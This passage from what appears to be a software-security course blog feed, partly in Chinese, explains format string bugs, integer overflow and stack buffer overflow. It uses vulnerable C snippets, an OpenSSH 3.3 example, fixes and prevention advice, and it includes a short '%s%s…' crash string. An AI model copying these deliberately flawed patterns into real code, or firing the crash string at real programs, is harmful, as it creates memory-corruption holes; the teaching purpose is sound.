class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(buf);  &lt;span class=&#34;comment&#34;&gt;// 存在格式化字符串漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;printf(buf);&lt;/code&gt;  直接使用了用户输入的内容作为格式化字符串。如果  &lt;code&gt;buf&lt;/code&gt;  中包含格式化占位符（如  &lt;code&gt;%s&lt;/code&gt; 、 &lt;code&gt;%x&lt;/code&gt; 、 &lt;code&gt;%n&lt;/code&gt;  等）， &lt;code&gt;printf()&lt;/code&gt;  会将其解释为格式化指令，从而造成安全隐患。&lt;/li&gt;
&lt;li&gt;修复：  &lt;code&gt;printf(&amp;quot;The input is: %s&amp;quot;, buf);&lt;/code&gt; ：% s 确保输入内容被当作普通字符串处理，而不是格式化字符串&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Denial of Service Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Denial of Service Attacks&#34;&gt;#&lt;/a&gt;Denial of Service Attacks&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Crash the program by attempting to access an invalid address&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use  &lt;code&gt;%s&lt;/code&gt;  to retrieve a value from the stack till encountering an invalid memory location&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The exploit string would look something like this&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;·printf(&amp;quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&amp;quot;);·&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The more %s used in the format string, the higher the chance of an invalid address&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Format String Attacks Prevention&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Format String Attacks Prevention&#34;&gt;#&lt;/a&gt;Format String Attacks Prevention&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Hard-coded format strings (e.g. no  &lt;code&gt;printf(arg)&lt;/code&gt; )&lt;/li&gt;
&lt;li&gt;Do not use the fancy  &lt;code&gt;%n&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Be careful with pass as references&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;%s&lt;/code&gt;  and  &lt;code&gt;sprintf&lt;/code&gt;  can be used to create disclosure attacks&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Compiler support to match  &lt;code&gt;printf&lt;/code&gt;  arguments with format string&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;e.g. the  &lt;code&gt;gcc&lt;/code&gt;  compiler provides options to check format strings&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Integer-overflow/</guid>
            <title>Integer overflow</title>
            <link>http://example.com/course/Integer-overflow/</link>
            <category>C</category>
            <category>software security</category>
            <pubDate>Sat, 26 Oct 2024 20:33:32 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Integer overflow&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Integer overflow&#34;&gt;#&lt;/a&gt;Integer overflow&lt;/h1&gt;
 When the result of an integer operation does not fit within the allocated memory space. All common languages are affected 
&lt;ol&gt;
&lt;li&gt;How Does an Integer Overflow Happen?
&lt;ol&gt;
&lt;li&gt;无符号整数溢出：例如，一个 32 位无符号整数的范围是 0 到 4,294,967,295（即 2**32 − 1 或 0xffffffff）。如果我们执行计算 4,294,967,295 + 1，则会导致溢出，因为结果超出了无符号整数的范围&lt;/li&gt;
&lt;li&gt;有符号整数溢出&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;符号位的溢出&lt;br&gt;
当一个整数运算的结果超过有符号整数的范围时，符号位（最高位）可能会被覆盖，从而引发溢出。&lt;br&gt;
有符号整数的符号位：在有符号整数中，最高位用来表示数值的正负。例如，32 位有符号整数的最高位是第 31 位（第 0 位到第 30 位是数值位）。溢出导致符号变化：如果运算结果超出正数范围，符号位会被设置为 1，这会导致数值被解释为负数。例如，在 32 位有符号整数中，+2,147,483,647 + 1 会导致数值变成 -2,147,483,648，因为符号位被改变。&lt;/li&gt;
&lt;li&gt;向下类型转换（Downcasting）和数值截断（Truncation）
&lt;ul&gt;
&lt;li&gt;向下类型转换：指将一个高精度的数据类型转换为低精度的数据类型。例如，将 long 类型转换为 int 时，如果原始值超过 int 的范围，可能会导致数值截断。&lt;/li&gt;
&lt;li&gt;数值截断可能导致溢出：截断发生时，较高位的数值会被忽略，只保留低位部分。这可能导致数值错误，甚至触发整数溢出。例如，如果一个 64 位的 long 类型被转换为 32 位的 int 类型，而其数值超过了 32 位整数的最大值，那么高位将被截断，只保留低 32 位，可能导致溢出或错误的计算结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Risks of Integer Overflow&lt;br&gt;
Mostly lead to program errors, but can have severe consequences&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Buffer overflow occurs when an integer overflow happens in calculating the length of the buffer&lt;/li&gt;
&lt;li&gt;Erroneous program behaviours in mission critical software Incorrect financial calculations&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Real-World Examples&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Real-World Examples&#34;&gt;#&lt;/a&gt;Real-World Examples&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Integer Overflow Leads to Buffer Overflow in OpenSSH 3.3&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nresp = packet_get_int(); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (nresp &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	response = xmalloc(nresp * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; nresp; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 		response[i] = packet_get_string(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;When  &lt;code&gt;nresp&lt;/code&gt;  is 1073741824 (1073741824*4=4294967296=2**32), results in an overflow&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xmalloc()&lt;/code&gt;  receives and allocates a 0-byte buffer&lt;/li&gt;
&lt;li&gt;The subsequent loop causes a heap buffer overflow (当循环试图将数据写入到  &lt;code&gt;response&lt;/code&gt;  时，由于  &lt;code&gt;response&lt;/code&gt;  并未真正分配内存，写入操作会覆盖其他内存区域，导致程序崩溃或被攻击者利用。)&lt;/li&gt;
&lt;li&gt;fixed:  &lt;code&gt;if (nresp &amp;gt; 0 &amp;amp;&amp;amp; nresp &amp;lt;= SIZE_MAX / sizeof(char *))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;A Real-World Vulnerability in the Handling JPEG Files&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getComment&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; len, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *src)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	size = len ‐ &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *comment = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(size + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(comment, src, size); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;整数下溢&lt;br&gt;
在这段代码中，变量  &lt;code&gt;len&lt;/code&gt;  和  &lt;code&gt;size&lt;/code&gt;  被声明为无符号整数（unsigned int），这意味着它们的值不能是负数。&lt;br&gt;
当  &lt;code&gt;len&lt;/code&gt;  小于 2 时，计算  &lt;code&gt;size = len - 2&lt;/code&gt;  会导致 整数下溢：&lt;br&gt;
例如， &lt;code&gt;len&lt;/code&gt;  为 1 时， &lt;code&gt;size&lt;/code&gt;  将变为 0xffffffff（4294967295），即无符号整数的最大值。&lt;br&gt;
下溢的原因在于无符号整数的运算特性，当减法结果为负时，会回绕（wrap around）到最大值。&lt;/li&gt;
&lt;li&gt;0 字节内存分配&lt;br&gt;
在下溢的情况下，当  &lt;code&gt;size&lt;/code&gt;  被设置为 0xffffffff 时，表达式  &lt;code&gt;size + 1&lt;/code&gt;  变为 0。&lt;br&gt;
这会导致  &lt;code&gt;malloc(0)&lt;/code&gt; ，即分配一个 0 字节的缓冲区。&lt;br&gt;
在许多系统中，0 字节的  &lt;code&gt;malloc()&lt;/code&gt;  是合法的，它会返回一个指针，但该指针不能被写入任何数据。&lt;/li&gt;
&lt;li&gt;堆缓冲区溢出&lt;br&gt;
 &lt;code&gt;memcpy(comment, src, size)&lt;/code&gt;  将从  &lt;code&gt;src&lt;/code&gt;  复制  &lt;code&gt;size&lt;/code&gt;  个字节到  &lt;code&gt;comment&lt;/code&gt; ，其中  &lt;code&gt;size&lt;/code&gt;  的值为 0xffffffff。&lt;br&gt;
由于  &lt;code&gt;comment&lt;/code&gt;  是一个 0 字节的缓冲区，这将导致 堆缓冲区溢出，可能覆盖其他堆内存区域，从而导致程序崩溃或被攻击者利用。&lt;/li&gt;
&lt;li&gt;修复&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (len &amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size = len - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Example 3&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;CopyStructs&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(InputFile* pInFile, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; count)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     m_pStructs = new Structs[count]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; count; i++) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!ReadFromFile(pInFile, &amp;amp;(m_pStructs[i]))) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;The C++’s  &lt;code&gt;new[]&lt;/code&gt;  operator, it is similar to  &lt;code&gt;malloc(count*sizeof(Structs))&lt;/code&gt; &lt;br&gt;
Allocate a buffer smaller than we need, the attacker is able to write over the buffer&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;By &lt;strong&gt;overflowing the multiplication operation&lt;/strong&gt; internally&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Example 4&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MAX_BUF 256&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;BadCode&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *input)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;short&lt;/span&gt; len; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[MAX_BUF]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     len = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(input); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (len &amp;lt; MAX_BUF) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buf, input); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;strlen()&lt;/code&gt;  返回无符号整数&lt;br&gt;
 &lt;code&gt;strlen()&lt;/code&gt;  返回的是无符号整数类型 &lt;code&gt;size_t&lt;/code&gt; ，通常是一个 32 位或 64 位无符号整数。&lt;br&gt;
 &lt;code&gt;len&lt;/code&gt;  被定义为一个 16 位有符号短整型 &lt;code&gt;short&lt;/code&gt; ，其范围是 -32,768 到 32,767。&lt;/li&gt;
&lt;li&gt;类型截断和符号翻转&lt;br&gt;
当  &lt;code&gt;strlen(input)&lt;/code&gt;  返回的长度超过  &lt;code&gt;32,767&lt;/code&gt;  时，赋值给  &lt;code&gt;short len&lt;/code&gt;  时会发生 类型截断，导致溢出。&lt;br&gt;
例如，如果  &lt;code&gt;strlen(input)&lt;/code&gt;  返回 40,000，那么赋值后， &lt;code&gt;len&lt;/code&gt;  的值将会变成 -25,536（溢出后的值），因为  &lt;code&gt;short&lt;/code&gt;  类型的最大正值只能到 32,767。&lt;br&gt;
这会将一个本应是大于 256 的值变成一个负数。&lt;/li&gt;
&lt;li&gt;缓冲区溢出风险&lt;br&gt;
在类型截断后， &lt;code&gt;len&lt;/code&gt;  可能是负数。条件  &lt;code&gt;if (len &amp;lt; MAX_BUF)&lt;/code&gt;  将会成立，因为负数小于 256。&lt;br&gt;
这意味着，即使输入字符串的实际长度超过了 256 字节， &lt;code&gt;strcpy(buf, input)&lt;/code&gt;  仍会被执行，导致缓冲区溢出。&lt;/li&gt;
&lt;li&gt;修复&lt;br&gt;
 &lt;code&gt;len = strnlen(input, MAX_BUF);&lt;/code&gt; : The  &lt;code&gt;strnlen()&lt;/code&gt;  function returns an integer value capped by  &lt;code&gt;MAX_BUF&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Integer Overflow Prevention&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Integer Overflow Prevention&#34;&gt;#&lt;/a&gt;Integer Overflow Prevention&lt;/h1&gt;
Integer overflow is very hard to discover and prevent
&lt;ol&gt;
&lt;li&gt;Runtime checks&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ubsan instruments binaries to be executed and checks the results of arithmetic operations&lt;/li&gt;
&lt;li&gt;Microsoft Visual C++ 2005 and later automatically catch calls to operator new that overflow&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Library support&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;SafeInt class performs safe operations&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Static analysis tools and formal verification techniques&lt;br&gt;
 在程序编译前对源代码进行分析，寻找潜在的整数溢出问题。这些工具可以检测代码中的常见整数运算错误，包括加减乘除溢出、类型转换溢出等&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Stack-buffer-overflow/</guid>
            <title>Stack buffer overflow</title>
            <link>http://example.com/course/Stack-buffer-overflow/</link>
            <category>C</category>
            <category>software security</category>
            <category>vulnerability</category>
            <pubDate>Sat, 26 Oct 2024 17:50:30 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Stack buffer overflow&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stack buffer overflow&#34;&gt;#&lt;/a&gt;Stack buffer overflow&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;The Process Stack&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Sample Process C Code&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; b, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; c)&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buffer1[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buffer2[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	A(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(...); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   	 ... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/26/671ca1b71cfbb.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;在调用函数时，函数参数是按照从右到左的顺序依次压入栈中。这种参数传递方式是 x86 架构的标准做法，用于保证函数参数在栈上的正确顺序。&lt;br&gt;
在这个例子中，函数  &lt;code&gt;A(int a, int b, int c)&lt;/code&gt;  被调用时， &lt;code&gt;c&lt;/code&gt;  首先被压入栈，然后是  &lt;code&gt;b&lt;/code&gt; ，最后是  &lt;code&gt;a&lt;/code&gt; 。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Buffer Overflow&lt;/li&gt;
